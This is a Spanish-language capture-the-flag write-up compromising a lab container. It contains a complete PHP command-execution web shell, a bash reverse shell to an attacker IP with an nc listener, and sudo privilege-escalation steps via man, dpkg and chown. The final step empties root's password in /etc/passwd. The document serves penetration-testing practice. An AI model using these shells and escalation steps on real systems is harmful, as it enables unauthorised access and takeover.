Fecha: 03/09/2024

Comienzo haciendo el escaneo, encontrando ftp en el puerto 21 y un apache en el 80, no siendo ninguna de las dos versiones vulnerable según seachsploit. 
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.3 -oN scan
```

![](Imágenes/Pasted%20image%2020240903185122.png)

Lo primero que haré es fuzzing para buscar páginas con información relevante:
```bash 
ffuf -c -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.3/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing  
```

![](Imágenes/Pasted%20image%2020240903185722.png)
Por lo que parece, lo que hay en el servicio ftp y lo que está en el servidor apache es lo mismo. Probaré por tanto a subir una shell de php como hice en la máquina [Dockerlabs](Dockerlabs.md): 

```php
SHELL:  
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

Subo el fichero en cuestión: 
![](Imágenes/Pasted%20image%2020240903190414.png)
Ahora ya puedo acceder a esta linea de comandos desde el buscador, así que me abro una reverse shell:
![](Imágenes/Pasted%20image%2020240903190436.png)

```bash
# En la shell virtual:
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'
# En mi máquina atacante:
nc -lvnp 9001
```

Lo primero que haré será tratar la tty: 
```bash
# Empezando desde la reverse shell:
script /dev/null -c bash

Control Z 

stty raw -echo; fg

reset xterm

export TERM=xterm
```

![](Imágenes/Pasted%20image%2020240903192511.png)
![](Imágenes/Pasted%20image%2020240903192817.png)

Ahora miro los permisos que tengo: 
![](Imágenes/Pasted%20image%2020240903192933.png)

Encuentro una forma de usar sudo con man para escalar privilegios: https://gtfobins.github.io/gtfobins/man/#sudo

```bash
sudo -u pingu man man 
!/bin/bash
```

Ahora miro qué permisos tengo como pingu:
![](Imágenes/Pasted%20image%2020240903193115.png)

Uso dpkg: https://gtfobins.github.io/gtfobins/dpkg/#sudo

```bash
sudo -u gladys dpkg -l 
!/bin/bash
```

![](Imágenes/Pasted%20image%2020240903193300.png)

Y, finalmente, como gladys, puedo usar chown para convertirme en superusuario https://gtfobins.github.io/gtfobins/chown/#sudo:

![](Imágenes/Pasted%20image%2020240903193354.png)

```bash
# Hago que todo el directorio sea mio
sudo chown gladys:gladys /etc
# Edito la linea en la que especifica la contraseña del root, dejándola vacía
sed -i 's/root:x:/root::/g' /etc/passwd


```

![](Imágenes/Pasted%20image%2020240903193807.png)

![](Imágenes/Pasted%20image%2020240903193942.png)